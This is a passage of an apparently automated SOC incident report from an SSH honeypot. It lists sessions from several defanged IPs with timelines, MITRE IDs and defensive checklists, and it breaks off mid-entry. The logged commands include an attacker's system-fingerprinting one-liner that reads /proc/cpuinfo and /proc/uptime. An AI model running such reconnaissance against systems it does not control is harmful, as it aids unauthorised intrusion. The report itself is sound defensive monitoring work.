| **First Seen** | 2026-06-27 12:09 |
| **Last Seen** | 2026-06-27 12:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:09:38` | `cowrie.session.connect` |
| `2026-06-27 12:09:38` | `cowrie.client.version` |
| `2026-06-27 12:09:38` | `cowrie.client.kex` |
| `2026-06-27 12:09:39` | `cowrie.login.success` |
| `2026-06-27 12:09:39` | `cowrie.session.params` |
| `2026-06-27 12:09:39` | `cowrie.command.input` |
| `2026-06-27 12:09:39` | `cowrie.log.closed` |
| `2026-06-27 12:09:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96f40e4ab8be

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:10 |
| **Last Seen** | 2026-06-27 12:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:10:25` | `cowrie.session.connect` |
| `2026-06-27 12:10:25` | `cowrie.client.version` |
| `2026-06-27 12:10:25` | `cowrie.client.kex` |
| `2026-06-27 12:10:25` | `cowrie.login.success` |
| `2026-06-27 12:10:26` | `cowrie.session.params` |
| `2026-06-27 12:10:26` | `cowrie.command.input` |
| `2026-06-27 12:10:26` | `cowrie.log.closed` |
| `2026-06-27 12:10:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9b9e3bd1186

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-06-27 12:10 |
| **Last Seen** | 2026-06-27 12:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:10:42` | `cowrie.session.connect` |
| `2026-06-27 12:10:42` | `cowrie.client.version` |
| `2026-06-27 12:10:42` | `cowrie.client.kex` |
| `2026-06-27 12:10:43` | `cowrie.login.success` |
| `2026-06-27 12:10:44` | `cowrie.session.params` |
| `2026-06-27 12:10:44` | `cowrie.command.input` |
| `2026-06-27 12:10:44` | `cowrie.command.input` |
| `2026-06-27 12:10:44` | `cowrie.command.input` |
| `2026-06-27 12:10:44` | `cowrie.command.input` |
| `2026-06-27 12:10:44` | `cowrie.log.closed` |
| `2026-06-27 12:10:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49892bc1c454

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:11 |
| **Last Seen** | 2026-06-27 12:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:11:11` | `cowrie.session.connect` |
| `2026-06-27 12:11:11` | `cowrie.client.version` |
| `2026-06-27 12:11:11` | `cowrie.client.kex` |
| `2026-06-27 12:11:12` | `cowrie.login.success` |
| `2026-06-27 12:11:13` | `cowrie.session.params` |
| `2026-06-27 12:11:13` | `cowrie.command.input` |
| `2026-06-27 12:11:13` | `cowrie.log.closed` |
| `2026-06-27 12:11:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c348a8fa625

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:11 |
| **Last Seen** | 2026-06-27 12:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:11:58` | `cowrie.session.connect` |
| `2026-06-27 12:11:58` | `cowrie.client.version` |
| `2026-06-27 12:11:58` | `cowrie.client.kex` |
| `2026-06-27 12:11:59` | `cowrie.login.success` |
| `2026-06-27 12:11:59` | `cowrie.session.params` |
| `2026-06-27 12:11:59` | `cowrie.command.input` |
| `2026-06-27 12:12:00` | `cowrie.log.closed` |
| `2026-06-27 12:12:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17e8d2645844

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-06-27 12:12 |
| **Last Seen** | 2026-06-27 12:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:12:41` | `cowrie.session.connect` |
| `2026-06-27 12:12:41` | `cowrie.client.version` |
| `2026-06-27 12:12:41` | `cowrie.client.kex` |
| `2026-06-27 12:12:42` | `cowrie.login.success` |
| `2026-06-27 12:12:43` | `cowrie.session.params` |
| `2026-06-27 12:12:43` | `cowrie.command.input` |
| `2026-06-27 12:12:43` | `cowrie.command.input` |
| `2026-06-27 12:12:43` | `cowrie.command.input` |
| `2026-06-27 12:12:43` | `cowrie.command.input` |
| `2026-06-27 12:12:43` | `cowrie.log.closed` |
| `2026-06-27 12:12:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae5fedc54a82

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:12 |
| **Last Seen** | 2026-06-27 12:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:12:45` | `cowrie.session.connect` |
| `2026-06-27 12:12:45` | `cowrie.client.version` |
| `2026-06-27 12:12:45` | `cowrie.client.kex` |
| `2026-06-27 12:12:45` | `cowrie.login.success` |
| `2026-06-27 12:12:46` | `cowrie.session.params` |
| `2026-06-27 12:12:46` | `cowrie.command.input` |
| `2026-06-27 12:12:46` | `cowrie.log.closed` |
| `2026-06-27 12:12:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db8120a1a454

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-27 12:13 |
| **Last Seen** | 2026-06-27 12:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:13:33` | `cowrie.session.connect` |
| `2026-06-27 12:13:33` | `cowrie.client.version` |
| `2026-06-27 12:13:33` | `cowrie.client.kex` |
| `2026-06-27 12:13:33` | `cowrie.login.success` |
| `2026-06-27 12:13:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1c4e4c19431

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-27 12:13 |
| **Last Seen** | 2026-06-27 12:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:13:35` | `cowrie.session.connect` |
| `2026-06-27 12:13:35` | `cowrie.client.version` |
| `2026-06-27 12:13:35` | `cowrie.client.kex` |
| `2026-06-27 12:13:35` | `cowrie.login.success` |
| `2026-06-27 12:13:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52edc6b15aee

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:13 |
| **Last Seen** | 2026-06-27 12:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:13:36` | `cowrie.session.connect` |
| `2026-06-27 12:13:36` | `cowrie.client.version` |
| `2026-06-27 12:13:36` | `cowrie.client.kex` |
| `2026-06-27 12:13:37` | `cowrie.login.success` |
| `2026-06-27 12:13:37` | `cowrie.session.params` |
| `2026-06-27 12:13:37` | `cowrie.command.input` |
| `2026-06-27 12:13:38` | `cowrie.log.closed` |
| `2026-06-27 12:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-483c984a156c

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-27 12:13 |
| **Last Seen** | 2026-06-27 12:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:13:37` | `cowrie.session.connect` |
| `2026-06-27 12:13:37` | `cowrie.client.version` |
| `2026-06-27 12:13:37` | `cowrie.client.kex` |
| `2026-06-27 12:13:37` | `cowrie.login.success` |
| `2026-06-27 12:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-001dd14e165f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-27 12:13 |
| **Last Seen** | 2026-06-27 12:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:13:37` | `cowrie.session.connect` |
| `2026-06-27 12:13:37` | `cowrie.client.version` |
| `2026-06-27 12:13:37` | `cowrie.client.kex` |
| `2026-06-27 12:13:38` | `cowrie.login.success` |
| `2026-06-27 12:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdd6b4f69f16

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 12:14 |
| **Last Seen** | 2026-06-27 12:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:14:13` | `cowrie.session.connect` |
| `2026-06-27 12:14:14` | `cowrie.client.version` |
| `2026-06-27 12:14:14` | `cowrie.client.kex` |
| `2026-06-27 12:14:16` | `cowrie.login.success` |
| `2026-06-27 12:14:18` | `cowrie.session.params` |
| `2026-06-27 12:14:18` | `cowrie.command.input` |
| `2026-06-27 12:14:18` | `cowrie.log.closed` |
| `2026-06-27 12:14:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43ba2a18492f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:14 |
| **Last Seen** | 2026-06-27 12:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:14:24` | `cowrie.session.connect` |
| `2026-06-27 12:14:24` | `cowrie.client.version` |
| `2026-06-27 12:14:24` | `cowrie.client.kex` |
| `2026-06-27 12:14:24` | `cowrie.login.success` |
| `2026-06-27 12:14:25` | `cowrie.session.params` |
| `2026-06-27 12:14:25` | `cowrie.command.input` |
| `2026-06-27 12:14:25` | `cowrie.log.closed` |
| `2026-06-27 12:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e4d73eed7f9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-06-27 12:14 |
| **Last Seen** | 2026-06-27 12:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:14:49` | `cowrie.session.connect` |
| `2026-06-27 12:14:49` | `cowrie.client.version` |
| `2026-06-27 12:14:49` | `cowrie.client.kex` |
| `2026-06-27 12:14:50` | `cowrie.login.success` |
| `2026-06-27 12:14:50` | `cowrie.session.params` |
| `2026-06-27 12:14:50` | `cowrie.command.input` |
| `2026-06-27 12:14:50` | `cowrie.command.input` |
| `2026-06-27 12:14:50` | `cowrie.command.input` |
| `2026-06-27 12:14:50` | `cowrie.command.input` |
| `2026-06-27 12:14:51` | `cowrie.log.closed` |
| `2026-06-27 12:14:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d9f73da67d0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:15 |
| **Last Seen** | 2026-06-27 12:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:15:11` | `cowrie.session.connect` |
| `2026-06-27 12:15:11` | `cowrie.client.version` |
| `2026-06-27 12:15:11` | `cowrie.client.kex` |
| `2026-06-27 12:15:11` | `cowrie.login.success` |
| `2026-06-27 12:15:12` | `cowrie.session.params` |
| `2026-06-27 12:15:12` | `cowrie.command.input` |
| `2026-06-27 12:15:12` | `cowrie.log.closed` |
| `2026-06-27 12:15:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a75152d3679

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:15 |
| **Last Seen** | 2026-06-27 12:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:15:59` | `cowrie.session.connect` |
| `2026-06-27 12:15:59` | `cowrie.client.version` |
| `2026-06-27 12:15:59` | `cowrie.client.kex` |
| `2026-06-27 12:15:59` | `cowrie.login.success` |
| `2026-06-27 12:16:00` | `cowrie.session.params` |
| `2026-06-27 12:16:00` | `cowrie.command.input` |
| `2026-06-27 12:16:00` | `cowrie.log.closed` |
| `2026-06-27 12:16:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3189a66d519f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:16 |
| **Last Seen** | 2026-06-27 12:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:16:48` | `cowrie.session.connect` |
| `2026-06-27 12:16:48` | `cowrie.client.version` |
| `2026-06-27 12:16:48` | `cowrie.client.kex` |
| `2026-06-27 12:16:49` | `cowrie.login.success` |
| `2026-06-27 12:16:49` | `cowrie.session.params` |
| `2026-06-27 12:16:49` | `cowrie.command.input` |
| `2026-06-27 12:16:49` | `cowrie.log.closed` |
| `2026-06-27 12:16:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4330750ba501

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-06-27 12:17 |
| **Last Seen** | 2026-06-27 12:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:17:23` | `cowrie.session.connect` |
| `2026-06-27 12:17:23` | `cowrie.client.version` |
| `2026-06-27 12:17:23` | `cowrie.client.kex` |
| `2026-06-27 12:17:24` | `cowrie.login.success` |
| `2026-06-27 12:17:25` | `cowrie.session.params` |
| `2026-06-27 12:17:25` | `cowrie.command.input` |
| `2026-06-27 12:17:25` | `cowrie.command.input` |
| `2026-06-27 12:17:25` | `cowrie.command.input` |
| `2026-06-27 12:17:25` | `cowrie.command.input` |
| `2026-06-27 12:17:25` | `cowrie.log.closed` |
| `2026-06-27 12:17:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71474abf8673

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:17 |
| **Last Seen** | 2026-06-27 12:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:17:37` | `cowrie.session.connect` |
| `2026-06-27 12:17:37` | `cowrie.client.version` |
| `2026-06-27 12:17:37` | `cowrie.client.kex` |
| `2026-06-27 12:17:37` | `cowrie.login.success` |
| `2026-06-27 12:17:38` | `cowrie.session.params` |
| `2026-06-27 12:17:38` | `cowrie.command.input` |
| `2026-06-27 12:17:38` | `cowrie.log.closed` |
| `2026-06-27 12:17:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2e1d02bfccc

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:18 |
| **Last Seen** | 2026-06-27 12:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:18:27` | `cowrie.session.connect` |
| `2026-06-27 12:18:27` | `cowrie.client.version` |
| `2026-06-27 12:18:27` | `cowrie.client.kex` |
| `2026-06-27 12:18:27` | `cowrie.login.success` |
| `2026-06-27 12:18:28` | `cowrie.session.params` |
| `2026-06-27 12:18:28` | `cowrie.command.input` |
| `2026-06-27 12:18:28` | `cowrie.log.closed` |
| `2026-06-27 12:18:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b8d76131aa1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 12:18 |
| **Last Seen** | 2026-06-27 12:18 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:18:35` | `cowrie.session.connect` |
| `2026-06-27 12:18:36` | `cowrie.client.version` |
| `2026-06-27 12:18:36` | `cowrie.client.kex` |
| `2026-06-27 12:18:41` | `cowrie.login.success` |
| `2026-06-27 12:18:44` | `cowrie.session.params` |
| `2026-06-27 12:18:44` | `cowrie.command.input` |
| `2026-06-27 12:18:47` | `cowrie.log.closed` |
| `2026-06-27 12:18:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06cc9033c3a3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:19 |
| **Last Seen** | 2026-06-27 12:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:19:18` | `cowrie.session.connect` |
| `2026-06-27 12:19:18` | `cowrie.client.version` |
| `2026-06-27 12:19:19` | `cowrie.client.kex` |
| `2026-06-27 12:19:19` | `cowrie.login.success` |
| `2026-06-27 12:19:20` | `cowrie.session.params` |
| `2026-06-27 12:19:20` | `cowrie.command.input` |
| `2026-06-27 12:19:20` | `cowrie.log.closed` |
| `2026-06-27 12:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a4e101a5c88

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:20 |
| **Last Seen** | 2026-06-27 12:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:20:07` | `cowrie.session.connect` |
| `2026-06-27 12:20:07` | `cowrie.client.version` |
| `2026-06-27 12:20:07` | `cowrie.client.kex` |
